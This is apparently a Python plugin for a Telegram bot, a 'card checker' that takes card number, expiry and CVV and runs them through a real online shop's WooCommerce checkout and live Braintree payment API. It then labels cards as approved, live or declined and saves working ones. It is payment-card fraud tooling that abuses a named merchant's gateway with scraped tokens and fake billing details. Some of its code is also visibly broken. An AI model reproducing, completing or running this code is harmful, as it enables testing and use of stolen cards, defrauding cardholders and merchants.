#https://www.gapminder.org/donations/
from values import *
import urllib.parse
import random
from bs4 import BeautifulSoup
import json
import requests
import time
import asyncio
import base64
from colored import fg, bg, attr
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 


from datos import idchat

@Client.on_message(filters.command(["bt"], ["/", "."]))
async def xi(_, message: Message):
    with open(file='plugins/usuarios/premium.txt',mode='r+',encoding='utf-8') as archivo:
        x = archivo.readlines()
        if str(message.from_user.id) + '\n' in x or message.chat.id in idchat:

            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("<b>⎚ Usar <code>/bt card</code></b>")
                return

            ccs  = data[1]
            card = ccs.split("|")
            cc   = card[0]
            mes  = card[1]
            if not mes:
                await message.reply_text("<b>⎚ Usar <code>/bt card</code></b>")
                return
            ano  = card[2]
            cvv  = card[3]
            bin_code = cc[:6]


            low_ano = lambda x: x[2:] if len(x) == 4 else x
            ano = low_ano(ano)
            session = requests.Session()
            inputm = message.text.split(None, 1)[1]
            bincode = 6
            BIN = inputm[:bincode]
            req = requests.get(f"https://bins.antipublic.cc/bins/{BIN}").json()
                    
                 
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            country_currencies = req['country_currencies']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            msg=await message.reply(f"""<b>⎚Gateway| Roma
Card: <code>{ccs}</code>
Progress 🔴 1.12(s)</b>""")

            url = 'https://www.recaptcha.net/recaptcha/api2/anchor?ar=1&k=6LfKlDgmAAAAAEL3_vZVQwYlbMxOWVXy6JtbT_Jy&co=aHR0cHM6Ly93d3cuYWNjdXJhdGVnZWxwYWNrcy5jb206NDQz&hl=es-419&v=pxZcVU8Dk73FyvFvdCgp2MSG&size=invisible&cb=c20mdocku6d0'
            
            anchor_ref = 'https://www.accurategelpacks.com/'
            
            reload_link = 'https://www.recaptcha.net/recaptcha/api2/reload?k=6LfKlDgmAAAAAEL3_vZVQwYlbMxOWVXy6JtbT_Jy'
            v = 'pxZcVU8Dk73FyvFvdCgp2MSG'
            k = '6LfKlDgmAAAAAEL3_vZVQwYlbMxOWVXy6JtbT_Jy'
            co = 'aHR0cHM6Ly93d3cuYWNjdXJhdGVnZWxwYWNrcy5jb206NDQz'
            chrr = urllib.parse.quote('')
            bg = '!v7mgubwKAAQeH9x-bQEHnAgE5Fpc8zI9gvbILTOEusF11CThIGXYBn6hqINImAq3bTUKvTOSTEFH9VGT5GwIbj6H2Go79BTi4Umkb9AydMfJbEY_6al3tbtF5J5ovbSxB94zDQMLSX9K-lqb_0zi9NJjZ0bWAQmJeDtg3r5NS3A9tW-04L9_X2u9RvPWbWCNBnPsB4z6u1gbp1LvZ7T9IopT5rXjcJxM9C13ZodGwnHe8zdFa1QkJa7HbMW60pmSl7RqCs7pMb2__EwMNNBOsx8rU1F-tS0_wGXdPO7ldvX5GPe0h6GDjYYOAOMc2J33QY3KDo1CPPhYYdpXA2VJgxbklNr7v9xWguNp1PpZo4HZXRcHTg6NP-92UjYfAMduPdJB2wGITBGTEnTlUZGh53rUtwxovHssG6p3jYfBs7gtuigRw77rWVa8OSAV0siwUbfVIZWZ9JEjd_NGq3iT0N4ClG-gWlqgeZ3J1ifA5NXjNKm2GZDaVAdHO2BHy3rk3TuedxjIPpQyMRYdfSzYZc6ckjC_0EeuhzEZY7CEhNHOXHmQz2P5WkdInp4SOhYx0k1mzf-iwcLsMelg25ChWnmVEUbRwTikBx35kBCG1ObeJ-Typ8oRO8yOmKmotRkuKw4ZZjA84O1HODSd8AkSN0ReW9EdIRQYC6URlaBBuSTnwLHnThsBwM0b2mRfd9tYEjOadge22bkLFMC07sZZyCguo0zH_TVR0w9DmhtVPgmvGYjFw77btFnnfTU1CGLLD7Oju93y6bXAmDgfKXuuca-BKOUtfQEWMundp0wxJNN6Jm--s4djLirDW3-fEQ5IbgpLs3k6N18gOjqhYRmSDTU5KLD-vLuGt_oha-8AeXkjTAlbjRdY_W6H5ISjvPxYZtSwzEFygNhZ-z6g3q2RIPpXO919-sp2SQs8h5uofPIm9NSE1VL15H85KvQDj10IsOGNmsixSV7GeVekuHhcGJFoaIMtun4eAcw3xcWZHUBv7YfTIVmhV18kHLA1BKWeMkHt-4hwlxDyZLaCL5aeGJY0zhNcudlYhU6IehBtAEZobAel-G8vYSZekTOvhJOHOX4u6OSYhxEeyXja9PZ5rMRXwDE9wbbVc6YNAuNI19dU9xyejOtvD_8E2Oi9dGG-SuVNyIVA_uwvmd7B2e8TdDNQ_Urcgeomfxn_a-1nAJnt2g5i2aDsKjMA27UzvGnjmZjZGc79xDnIm2Ai9K74ROXSuqA7hkcC9n39kIBqv7k3U48_LA1oiBe9HodF7t7Fwb8t_36a_R1J19EoFfRUgnbb3o5WqaPuo8Z6i4PgCWR0JYkf_FD2ZiWOKNno4d5xaG10oSQtdD5IPtlTscHGb9iD5UM2e6gn_pvM1ZY-tUaf9kJ1JyHJnIytbDMxAgAnXB-8T8S-CLJbbLYAMpksS0yyIvX79F2W5YO3AdCWx_Yg5S1qCYk0eelCHjPAuOpTw8kfz0qa_eYJ7N4klcVmev6Oj9E7SPa7RJUtD8POmyJjo3kR0cCkBFJNDIPGhTiW_HWNqPSDeDRqMGaGKYNrwN-60RSTfZPjR-pRI3c__eyyPJxx-RjPiLJ8Kl2o-kF-4WNRY8fLYon9ZzmZ4eNPHwachW61_lVIwToj9MXPjH67bBn5_IVT4W2MuD4YvOwoMjQbk1lgzq8Bj4kDc6nc2K40y09-OYz4IibU1kglkJdqBFW8_tdrpK0yIHMzRTZ_E4qF1V4gbe04OT8iPNd2dThvadMt6uU5N4X5bXSLKYbtCGYgr_cIATSpFB-kDR8PmsNzlvzLXCFDO4kZq-JtrT7zooIoqmOA7mOnjVfScmlA7KvsIPfeZGuIHDZpg7o1cZvhsdQPEbrwpSQhAmYuQLBWtCxTOc-TRfL_q1qEeyvbV7YlZfDg6kvG6otkFbU42YqGQfUvwgCBeilNHCrfpCm2rTKT52WEgNbDxU2XeINYOqKpTQInDoUBUPNwaAynzq7pvjXuSzv90dJXdX9nKX64BG28w0gY5i_sSrk-lXJ-Xj5REJR9yKNES2L-MsXbRV0RWl8LH4G_nKykfjxFu-8InkuPkUzkpV2JS5yayXBAVptORnEynan5ydScEc2AutoVopd8xDzkdGWHOHyMMSGRalSyNdjgfc1VIWTZjJJTYWxpif9VwwPhfXS1V3adiiHw0w1YGbf2U1frGSOTbvWb_tVbTb8GJ5P5xwnqCF0QaGUge_Z0-TkDItqp9rAcxOBYz8T2lyVrR_SatloiYIq7ED-8thJhlXw9ljq0sb2F52givqMA7wowtHzVQUaFM0PkQ4yLQRVbGDxdt4eolzYAiSn0g6nq_B9HXm5HoNGOn_2scTUcLy8yR8syl74w8yXgkjODDU85tRJC3G6BrYXZckrD9-CneoLijzrLzVVY7E4rg83Xdqf22tmfQCYSq16PwAS9diVPeUoytsaug68oNNLXc1agCVJRfThXmP9gRd1FsCa2Mkat0d1z0Ys8yPhIIHgDuIkYy_Ev8S5K3TSbsyH51n0lwRW3tm--HnH3nUKdg7TANuUvifxzviK1LO85Wu0Os8rINGG24591XaJNvO-aR28FfaH3-CdBOXbmEeqnVfvJFISNU8gmvjVLZ8xrstmovp_LHHfz8KLzvYns1pViMam1mVRZU8kYdTYEJg_NJoeSKH7t-s_Ikxi7-bC18myUb0ylDzg8lNrnIZRUOevmXKOAGGR2i1ccVMMOSLHM0xcRdVZXvjurzdwmX9SGhLFw*'
            vh = '2490759722'
            
            url = 'https://www.accurategelpacks.com/product/sleeve-6x10/'
            
            headers = {
              'authority': 'www.accurategelpacks.com',
              'method': 'POST',
              'path': '/product/sleeve-6x10',
              'upgrade-insecure-requests': '1',
              'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
              'accept-language': 'es-MX,es-419;q=0.9,es;q=0.8',
              'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryuEvZh9HHr6GG8ABe',
              'origin': 'https://www.accurategelpacks.com',
              'referer': 'https://www.accurategelpacks.com/product/sleeve-6x10/',
              'sec-fetch-dest': 'document',
              'sec-fetch-mode': 'navigate',
              'sec-fetch-site': 'same-origin',
              'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
              
            }
            data = {
              'attribute_pa_style': 'velcro-closure',
              'quantity': '1',
              'add-to-cart': '286',
              'product_id': '286',
              'variation_id': '2058'
              
            }
            res = requests.post(url, headers=headers, data=data)
            
            
            url = 'https://www.accurategelpacks.com/checkout/'
            
            headers = {
              'authority': 'www.accurategelpacks.com',
              'method': 'GET',
              'path': '/checkout/',
              'upgrade-insecure-requests': '1',
              'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
              'accept-language': 'es-MX,es-419;q=0.9,es;q=0.8',
              'referer': 'https://www.accurategelpacks.com/cart/',
              'sec-fetch-mode': 'navigate',
              'sec-fetch-site': 'same-origin',
              'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
              
            }
            response = requests.get(url, headers=headers)
            print(response)
            if 'var wc_braintree_client_token = ["' '"];' in response.text:
              embearer = response.text('var wc_braintree_client_token = ["', '"];')
              decode = json.loads(base64.b64decode(embearer))
              bearer = decode['authorizationFingerprint']
            nonce = response.text('name= "woocommerce-process-checkout-nonce" value=', '"')
            
            url = 'https://payments.braintree-api.com/graphql'
            
            headers = {
              'authority': 'payments.braintree-api.com',
              'accept': '*/*',
              'accept-language': 'es-MX,es-419;q=0.9,es;q=0.8,en;q=0.7',
              'authorization': 'Bearer ' + bearer,
              'braintree-version': '2018-05-10',
              'content-type': 'application/json',
              'origin': 'https://assets.braintreegateway.com',
              'referer': 'https://assets.braintreegateway.com/',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'cross-site',
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36'
              
            }
            data = {
              "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "31042aab-2b91-47c2-84c0-19dc9965bb3e"
                
              },
              "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
              "variables": {
                "input": {
                  "creditCard": {
                    "number": cc,
                    "expirationMonth": mes,
                    "expirationYear": ano,
                    "cvv": cvv,
                    "billingAddress": {
                      "postalCode": "10080",
                      "streetAddress": "street90"
                      
                    }
                    
                  },
                  "options": {
                    "validate": False
                    
                  }
                  
                }
                
              },
              "operationName": "TokenizeCreditCard"
              
            }
            
            response = requests.post(url, headers=headers, data=data)
            token = response.text.split('"token":"')[1].split('"')[0]
            
            msg1=await msg.edit(f"""<b>⎚Gateway | Rusia
Card: <code>{ccs}</code>
Progress 🟠 4.40(s)</b>""")
            
           
            url = 'https://www.accurategelpacks.com/?wc-ajax=checkout&nocache=1696315619237'
            headers = {
              'authority': 'www.accurategelpacks.com',
              'method': 'POST',
              'accept': 'application/json, text/javascript, */*; q=0.01',
              'accept-language': 'es-MX,es-419;q=0.9,es;q=0.8',
              'x-requested-with': 'XMLHttpRequest',
              'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
              'origin': 'https://www.accurategelpacks.com',
              'referer': 'https://www.accurategelpacks.com/checkout/',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'same-origin',
              'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
              
            }
            
            data = {
              'billing_email': email,
              'is_required': 'no',
              'cart_frequency_field': '1',
              'cart_frequency_field': 'month',
              'cart_end_date_field': 'never_expire',
              'shipping_first_name': 'cessr',
              'shipping_last_name': 'ramos',
              'shipping_company': '',
              'shipping_address_1': 'street90',
              'shipping_address_2': '',
              'shipping_country': 'US',
              'shipping_postcode': '10080',
              'shipping_state': 'NY',
              'shipping_city': 'New+York+City',
              'shipping_phone': '5052217458',
              'shipping_method[0]': 'flat_rate:3',
              'payment_method': 'braintree_cc',
              'braintree_cc_nonce_key': token,
              'braintree_cc_device_data': '{"device_session_id":"e15aba848d846ca41db5686a08171a90","fraud_merchant_id":null,"correlation_id":"207d086afdc3962381efd3a0f4269ac7"}',
              'braintree_cc_3ds_nonce_key': '',
              'braintree_cc_config_data': '%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fn2fdp2g4g72rc8ng%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fn2fdp2g4g72rc8ng%22%7D%2C%22merchantId%22%3A%22n2fdp2g4g72rc8ng%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22American+Express%22%2C%22Discover%22%2C%22JCB%22%2C%22MasterCard%22%2C%22Visa%22%2C%22UnionPay%22%5D%7D%2C%22threeDSecureEnabled%22%3Afalse%2C%22threeDSecure%22%3Anull%2C%22androidPay%22%3A%7B%22displayName%22%3A%22Accurate+Manufacturing%2C+Inc.%22%2C%22enabled%22%3Atrue%2C%22environment%22%3A%22production%22%2C%22googleAuthorizationFingerprint%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTY0MDE5MTAsImp0aSI6ImRkNDYyZjlhLThiNzYtNDMzMi05YWM2LWU3Zjc1YTZmZTU2ZSIsInN1YiI6Im4yZmRwMmc0ZzcycmM4bmciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im4yZmRwMmc0ZzcycmM4bmciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.zxr3ekvRpWGSDv0pCriF6idXNzpYlcH1ANvQhL4_iqnFeKR4F6MAlzNEOSZMZWc_urX5IhgosWG8GehAOSdo4g%22%2C%22paypalClientId%22%3A%22AcjUyGIqPHs5IVpYfyJaOPzutHiNXM_mj_izSmL3rM-0wjMv3nRvoHhH1mnYm2M9aAfAjS3cSBGiIZfT%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Accurate+Manufacturing%2C+Inc.%22%2C%22clientId%22%3A%22AcjUyGIqPHs5IVpYfyJaOPzutHiNXM_mj_izSmL3rM-0wjMv3nRvoHhH1mnYm2M9aAfAjS3cSBGiIZfT%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22accuratemanufacturinginc_instant%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%7D',
              'braintree_paypal_nonce_key': '',
              'braintree_paypal_device_data': '%7B%22device_session_id%22%3A%22e15aba848d846ca41db5686a08171a90%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22207d086afdc3962381efd3a0f4269ac7%22%7D',
              'ship_to_different_address': '1',
              'bill_to_different_address': 'same_as_shipping',
              'billing_first_name': 'cessr',
              'billing_last_name': 'ramos',
              'billing_company': '',
              'billing_address_1': 'street90',
              'billing_address_2': '',
              'billing_country': 'US',
              'billing_postcode': '10080',
              'billing_state': 'NY',
              'billing_city': 'New+York+City',
              'billing_phone': '5052217458',
              'terms': 'on',
              'terms-field': '1',
              'g-recaptcha-response': captcha,
              'woocommerce-process-checkout-nonce': nonce,
              '_wp_http_referer': '%2F%3Fwc-ajax%3Dupdate_order_review%26nocache%3D1696315601769',
              'cfw_update_cart': 'false',
              'cfw-promo-code': '',
              
            }
            
            response1 = requests.post(url, headers=headers)
            print(response1.text)
            
     
            
            msg2=await msg1.edit(f"""<b>⎚Gateway | Rusia
Card: <code>{ccs}</code>
Progress 🟢 6.20(s)</b>""")

            

            
            if 'success' in response1.text:
                status = "Approved✅"
                msg = "Charged CVV"
                save_live(ccs)
            elif 'Insufficient Funds' in response1.text:
                status = "Approved✅"
                msg = "insufficient funds"
            elif 'The card verification number does not match' in response1.text:
                status = "Approved CCN✅"
                msg = "The card verification number does not match"
            elif 'transaction_not_allowed' in response1.text:
                status = "Decined❌"
                msg = "transaction not allowed"
            elif 'Do Not Honor' in response1.text:
                status = "Declined❌"
                msg = "Do Not Honor"
            elif 'stolen_card' in response1.text:
                status = "Declined❌"
                msg = "stolen card"
            elif 'lost_card' in response1.text:
                status = "Declined❌"
                msg = "lost_card"
            elif "pickup_card" in response1.text:
                status = "Declined❌"
                response = "Pickup Card"
            elif "incorrect_number" in response1.text:
                status = "Declined❌"
                msg = "Incorrect Card Number"
            elif "expired_card" in response1.text:
                status = "Declined❌"
                msg = "Expired Card"
            elif "generic_decline" in response1.text:
                status = "Declined❌"
                msg = "Generic Decline"
            elif "fraudulent" in response1.text:
                status = "Declined❌"
                msg = "Fraudulent"
            elif "lock_timeout" in response1.text:
                status = "Declined❌"
                response = "Api Error"
            elif "Your card was declined." in response1.text:
                status = "Declined❌"
                msg = "Generic Decline"
            elif "intent_confirmation_challenge" in response1.text:
                status = "Declined❌"
                msg = "Captcha"
            elif "Your card does not support this type of purchase." in response1.text:
                status = "Live 🟡"
                msg = "Locked Card"
            elif "parameter_invalid_empty" in response1.text:
                status = "Declined❌"
                msg = "404 error"
            elif "requires_action" in response1.text:
                status = "Declined❌"
                msg = "three 3ds Secure"    
            elif "invalid_request_error" in response1.text:
                status = "Declined❌"
                msg = "404 error"
            
            else:
                status = "Declined❌"
                msg = "Gate Dead"
            
            await msg2.edit(f"""
<b> 

⊗ Card - <code>{ccs}</code> 
⊗ Status - {status}
⊗ Response - {msg}
⊗ GATEWAY- Rusia 
－－－－－－－－－－－－－－
[ BIN INFO ]
⚆ Bin - {BIN} - {brand} - {typea} - {level}
⚆ Bank - {bank} 🏛  
⚆ Country - {country} - {country_flag} 
－－－－－－－－－－－－－－
[ CHECK INFO ]
⌧ Proxy  - Live! ✅ 
⌧ Time Test - 7.4sec
⌧ Checked by: <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> ♻️
⌧ Bot by - <b><a href="tg://resolve?domain=Sarcehkr">SarceDev[Owner]</a></b>
－－－－－－－－－－－－－－</b>
            """)
            
            
            